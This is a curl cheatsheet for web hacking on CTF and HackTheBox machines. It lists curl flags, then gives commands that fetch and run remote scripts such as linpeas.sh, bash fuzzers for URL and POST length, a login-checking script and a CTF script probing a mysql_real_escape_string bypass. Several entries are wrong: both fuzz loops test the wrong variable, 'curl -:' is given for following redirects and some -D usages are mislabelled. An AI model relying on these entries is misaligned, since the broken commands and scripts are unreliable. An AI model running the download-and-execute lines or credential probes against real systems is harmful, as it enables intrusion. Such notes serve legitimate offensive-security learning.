# Curl Cheatsheet

This is a cheatsheet and assimilation of curl relating web hacking articles, blogs and other cheatsheets; all referenced at the end of this cheatsheet. `curl` your way to victory! To really learn I read the article that this is based on and improved in a more two part format: simple: `flag: usage`; then addition in depth information about `curl` with Frizb cheatsheet as starting point.

[Curl](https://github.com/curl/curl) is a command line tool and library for transferring data with URL syntax. [Frizb](https://github.com/frizb/HackingWithCurl): *"cURL is short for "Client URL" and is a computer software project providing a library (libcurl) and command-line tool (curl) first released in 1997. It is a free client-side URL transfer library that supports the following protocols: `Cookies, DICT, FTP, FTPS, Gopher, HTTP/1, HTTP/2, HTTP POST, HTTP PUT, HTTP proxy tunneling, HTTPS, IMAP, Kerberos, LDAP, POP3, RTSP, SCP, and SMTP` Although attack proxies like BurpSuitePro are very handy tools, cURL allows you to get a bit closer to the protocol level, leverage bash scripting and provides a bit more flexibility when you are working on a complex vulnerability."*

```bash
# Usage
curl [option] [Protocol:HTTP, HTTPS, FTP, FTPS, SCP, SFTP, TFTP, DICT, TELNET, LDAP or FILE]

# Help
curl -h # help
curl --help # same as -h
curl --manual # whole man page

# Verbose
# View verbose debugging information (response headers and other debug details - STD2)
curl -v # verbose
curl -vv # even more verbose

# Debug trace
--trace

# Silent Errors
--silent 

# Dumping to file or stdin
curl - url # stdin
curl -D url # file
curl -D - url # Both

# GET 
# HTTP GET variables can be set by adding them to the URL.
curl http://10.10.10.10/index.php?sessionid=vn0g4d94rs09rgpqga85r9bnia

# Upload file!!!
curl -T url   

# Redirect output to the file
curl http://url/file > file
# follow HTTP/1.1 302 Found redirects
curl http://url/file -L > file # -L Follow redirects

# Write to file instead of stdou
# -o to save the file under a different name
# -O to save the file under the same name
curl -o file http://url/file
curl --output file http://url/file

# Write output to a file named as the remote file
# -o to save the file under a different name
# -O to save the file under the same name
curl -o file http://url/file
curl --output file http://url/file

# Execute remote script

bash <(curl -s http://url/myscript.sh)

# Inspect headers
curl -I url # display header
# Fetch the headers silently
curl -I -s https://domain.com   
curl "http://$IP" -X OPTIONS -I # Get all the options

# Basic authentification

curl --user username:password http://example.com/
curl -u username:password http://example.com/

# SSL
# Suppress web cert errors with -k, 
# --insecure allow insecure server connections when using SSL
    --cacert <file>
    --capath <dir>
-E, --cert <cert>     # --cert: Client cert file
    --cert-type       # der/pem/eng
-k, --insecure        # for self-signed certs
curl -k https://server_with_self_signed_cert/endpoint
curl --insecure https://server_with_self_signed_cert/endpoint

# HTTP Specify Request
# -X, --request <command> specify request command to use
# example:
curl -X GET http://url/endpoint

# HTTP header
# -H, --header <header/@file> pass custom header(s) to server
# same as --HEAD 
# example:
curl -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36' http://url/endpoint

# HTTP POST data
# POST variables can be set using the -d (--data) parameter.  
# transfer data 'inside-the-single-quotes'
# -d 'data=data&data=data'     
# -d, --data <data> HTTP POST data
# -d, --data @data HTTP POST data from file
# example:
curl -d '{json}' -H 'Content-Type: application/json' http://url/endpoint

# Proxy
# Curl -x <proxy from> <url to proxy to> 
# if you have to view page through a proxy, specify the server
curl -x [protocol://]host[:port] url

# config file
curl -K file #

#or # Read config from a file
curl --config file #

$HOME/.curlrc # Default config file in UNIX-like systems

# Override encoding error of ZIP files with --compressed
--compressed                            

#  limit the connection speed to 1,234 bytes/second:
curl --limit-rate 1234B http://www.ismycomputeron.com/

curl -d

# Display progress metre
curl -#

# Resume broken download without specifying an offset
curl -C- 

# User Agent
# You can specifiy user agent to make request to the server
curl -A "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" http://10.10.10.10/login.php
# Remove User agent
curl -A ''

# Follow redirects
curl -:                                                         

# COOKIEs
# cURL has an entire cookie engine
# Can be used to store and load cookies passed to it from a server between sessions:
# -c to save cookies! 
curl -b oldcookies.txt -c newcookies.txt http://10.10.10.10/login.php
# You can also specify your own cookies using the -b parameter and string: 'cookie-string':
curl -b "PHPSESSID=vn0g4d94rs09rgpqga85r9bnia" http://10.10.10.10/home.php

# Forms
curl -F "firstname=John" -F "lastname=Doe" "https://httpbin.org/post"
# With File upload
curl -F "firstname=John" -F "lastname=Doe" "https://httpbin.org/post" -F "file=@file.txt"
# Upload a binary file with a mime type
curl -F 'file=@photo.png;type=image/png' https://site.com/uploadf

# Referer
# Add Referer or remove referer 
curl -e url 
curl -e ''

# Inspect Redirect Responses
curl https://httpbin.org/status/302  -w "%{response_code} %{redirect_url}" -s -o /dev/null
302 https://httpbin.org/redirect/1

```

## Uploading

The proper way to upload files with CURL is to use **-F ( — form)** option, which will add **enctype=”multipart/form-data”** to the request.

```bash
curl -F ‘data=@path/to/local/file’ UPLOAD_ADDRESS`
```

## Hacking with cURL
Now that we have covered the basic syntax and use cases, here are some practical hacking applications that are very helpful on Hackthebox or CTF boxes.

#### Using cURL to pipe a remote script (linpeas.sh) directly to bash:
```Bash
$ curl -sSk "http://10.10.10.10/linpeas.sh" | bash
```

#### Attacking a Login Form with cURL
```Bash
$ curl --data "email=test@test.com&password=test" http://10.10.10.10/login.php
```

#### Creating new users with cURL
```Bash
$ curl --data "name=test&email=test@test.com&password=test" http://10.10.10.10/newuser.php
```

#### Fuzzing Web Servers with cURL
Often we performing an assessment against a webserver, we will attempt to trigger error conditions which will provide some deeper insights into the underlying processes and software. cURL can be a powerful fuzzing tool for generating these edge case error messages.

#### Fuzzing with URI length / GET parameter length limits with cURL

The following script can be used to fuzz a webserver with a long URL track the changes in output and write the output to a file.
It is meant to be a basic scaffold for you to build a fit for purpose fuzzer using cURL and Bash.
You can modify the url to either fuzz a URI or a GET parameter.

Here is the bash shell script:
```Bash
#!/bin/bash
echo "args: <URL> <Start Length #> <End Length #> <Output Filepath>"
echo "Length Lines Words Bytes Filename"
echo "---------------------------------"
for ((i = $2; x <= $3; i++))
do
        fuzz=""
        for ((x = 1; x <= $i; x++))
        do
                fuzz+="A"
        done
        #echo "COUNT: $i $fuzz"
        #echo "${1}${fuzz}"
        echo "${i}" | { tr -d '\n' ; curl "${1}${fuzz}" -o ${4} 2>/dev/null | wc ${4}; }
done
```

Here is an example of what it looks like running:
```
./fuzz_url.sh http://10.10.10.10/ 1000 1000000 output.txt
args: <URL> <Start Length #> <End Length #> <Output Filepath>
Length Lines Words Bytes Filename
---------------------------------
1000 9  31 274 output.txt
...
...
100000 11  37 343 output.txt
100001 11  37 343 output.txt
100002 11  37 343 output.txt
100003 11  37 343 output.txt
100004 11  37 343 output.txt
100005 11  37 343 output.txt
```

#### Fuzzing POST parameter length limits with cURL

The following script can be used to fuzz a webserver POST parameters and write the output to a file and track changes to that output.
It is meant to be a basic scaffold for you to build a fit for purpose fuzzer using cURL and Bash.

Here is the bash shell script:
```Bash
#!/bin/bash
echo "args: <URL> <Start Length #> <End Length #> <Output Filepath> <Post data: var=value&var2=valuefuzz>"
echo "Length Lines Words Bytes Filename"
echo "---------------------------------"
for ((i = $2; x <= $3; i++))
do
        fuzz=""
        for ((x = 1; x <= $i; x++))
        do
                fuzz+="A"
        done
        #echo "COUNT: $i $fuzz"
        #echo "${5}${fuzz}"
        echo "${i}" | { tr -d '\n' ; curl "${1}" -o ${4} -d "${5}${fuzz}" 2>/dev/null | wc ${4}; }
done

```

Here is an example of what it looks like running:
```
./fuzz_post.sh http://10.10.10.10/ 1000 1000000 output.txt "user=test&password=test"
args: <URL> <Start Length #> <End Length #> <Output Filepath>
Length Lines Words Bytes Filename
---------------------------------
1000 9  31 274 output.txt
...
...
100000 11  37 343 output.txt
100001 11  37 343 output.txt
```

#### Check to see if a user login is correct in a Bash script

The following script can be used to verify that a username and login is correct.
It is meant to be a basic scaffold for you to build a fit for purpose fuzzer using cURL and Bash.
It will check the response length characters to see if it is a valid response.  You will need to adjust the expected character count for your application. 
```bash
#!/bin/bash
result=($(curl --data "email=$2&password=$3" "$1" 2>/dev/null | wc -c))
echo $result
if [ "$result" == '0' ]
then
        echo 'zero'
else
        echo 'NOT zero'
fi
```
Here is the script in action:
```bash
$ ./check_user.sh http://10.10.10.10/login.php test@test.com testpassword
0
NOT zero
```

#### Automate user creation and test for mysql_real_escape_string bypass
The following is a basic scaffold for you to build a fit for purpose fuzzer using cURL and Bash.
Here is a bash script I created for a CTF to validate a theory I had about its use of the PHP mysql_real_escape_string method:
```BASH
#!/bin/bash
# Test for mysql_real_escape_string
email=test@test.com
password=1234567890123456789012345678901234567890123456789012345678901234567890123456789
fuzz="뽜’’AA"
name="‘¿’’AA"
ip="10.10.10.10"
echo "Creating User: ${email}"
curl -i -b 'cookies.txt' -c 'cookies.txt' -d "name=${name}&email=${email}&password=${password}&type=Admin" "http://${ip}/index.php" 2>/dev/null
echo " "
echo "============================================"
echo "Login as User"
echo "============================================"
curl -i -c 'cookies.txt' -d "email=${email}&password=${password}&type=Admin" "http://${ip}/index.php" 2>/dev/null  | grep 'location'
echo " "
echo "============================================"
echo "Check user profile with cookie"
echo "============================================"
curl -b 'cookies.txt' "http://${ip}/index.php" -v 2>/dev/null | grep 'td align="center"'
echo " " 
echo "============================================"
echo "Change Name"
echo "============================================"
curl -b 'cookies.txt' -d "name=${fuzz}&type=Admin" "http://${1}/index.php" 
echo " " 
curl -b 'cookies.txt' "http://${ip}/profile.php" 2>/dev/null | grep 'td align="center"'
echo " "
echo " DELETEING COOKIE "
rm cookies.txt
echo "============================================"
echo "Relogin as User - did password change?"
echo "============================================"
curl -i -c 'cookies.txt' -d "email=${email}&password=${password}&type=Admin" "http://${ip}/index.php"  2>/dev/null  | grep 'location'
echo " " 
echo " DONE!"
echo " DELETEING COOKIE "
rm cookies.txt
```

#### Write out parameters

From the [awesome-cheatsheets]((https://github.com/LeCoupa/awesome-cheatsheets/blob/master/tools/curl.sh)
```bash
# -w, --write-out <format> Use output FORMAT after completion
# example:
curl -w %{size_header} --silent -o /dev/null http://gogle.com # print size of header when you accessing google.com

# FORMAT supported:
# %{content_type}       # shows the Content-Type of the requested document, if there was any.
# %{filename_effective} # shows the ultimate filename that curl writes out to.
                        # This is only meaningful if curl is told to write to a file with
                        # the --remote-name or --output option. It's most useful in combination
                        #  with the --remote-header-name option.
# %{ftp_entry_path}     # shows the initial path curl ended up in when logging on to the remote FTP server.
# %{response_code}      # shows the numerical response code that was found in the last transfer.
# %{http_connect}       # shows the numerical code that was found in the last response (from a proxy)
                        # to a curl CONNECT request.
# %{local_ip}           # shows the IP address of the local end of the most recently done connection—can
                        # be either IPv4 or IPv6
# %{local_port}         # shows the local port number of the most recently made connection
# %{num_connects}       # shows the number of new connects made in the recent transfer.
# %{num_redirects}      # shows the number of redirects that were followed in the request.
# %{redirect_url}       # shows the actual URL a redirect would take you to when an HTTP request
                        # was made without -L to follow redirects.
# %{remote_ip}          # shows the remote IP address of the most recently made connection—can be
                        # either IPv4 or IPv6.
# %{remote_port}        # shows the remote port number of the most recently made connection.
# %{size_download}      # shows the total number of bytes that were downloaded.
# %{size_header}        # shows the total number of bytes of the downloaded headers.
# %{size_request}       # shows the total number of bytes that were sent in the HTTP request.
# %{size_upload}        # shows the total number of bytes that were uploaded.
# %{speed_download}     # shows the average download speed that curl measured for the complete download
                        # in bytes per second.
# %{speed_upload}       # shows the average upload speed that curl measured for the complete upload in
                        # bytes per second.
# %{ssl_verify_result}  # shows the result of the SSL peer certificate verification that was requested.
                        # 0 means the verification was successful.
# %{time_appconnect}    # shows the time, in seconds, it took from the start until the SSL/SSH/etc connect/handshake
                        # to the remote host was completed.
# %{time_connect}       # shows the time, in seconds, it took from the start until the TCP connect to the remote
                        # host (or proxy) was completed.
# %{time_namelookup}    # shows the time, in seconds, it took from the start until the name resolving was completed.
# %{time_pretransfer}   # shows the time, in seconds, it took from the start until the file transfer was just about
                        # to begin. This includes all pre-transfer commands and negotiations that are specific to
                        # the particular protocol(s) involved.
# %{time_redirect}      # shows the time, in seconds, it took for all redirection steps including name lookup, connect,
                        # pre-transfer and transfer before the final transaction was started. time_redirect shows
                        # the complete execution time for multiple redirections.
# %{time_starttransfer} # shows the time, in seconds, it took from the start until the first byte was just about to
                        # be transferred. This includes time_pretransfer and also the time the server needed
                        # to calculate the result.
# %{time_total}         # shows the total time, in seconds, that the full operation lasted. The time will be displayed
                        # with millisecond resolution.
# %{url_effective}      # shows the URL that was fetched last. This is particularly meaningful if you have told curl
                        # to follow Location: headers (with -L)
```

## References
[curl.se](https://curl.se/?lang=php)
[Github Curl Official](https://github.com/curl/curl)
[badger's CS](https://github.com/curl/curl-cheat-sheet)
[awesome-cheatsheets]((https://github.com/LeCoupa/awesome-cheatsheets/blob/master/tools/curl.sh)
[frizb's Hacking With cURL article](https://github.com/frizb/HackingWithCurl)
[abiydv's CS](https://abiydv.github.io/posts/curl-cheatsheet/)
[devhints.io](https://devhints.io/curl)
[andreafortuna's CS](https://andreafortuna.org/2020/05/14/curl-my-own-cheatsheet/)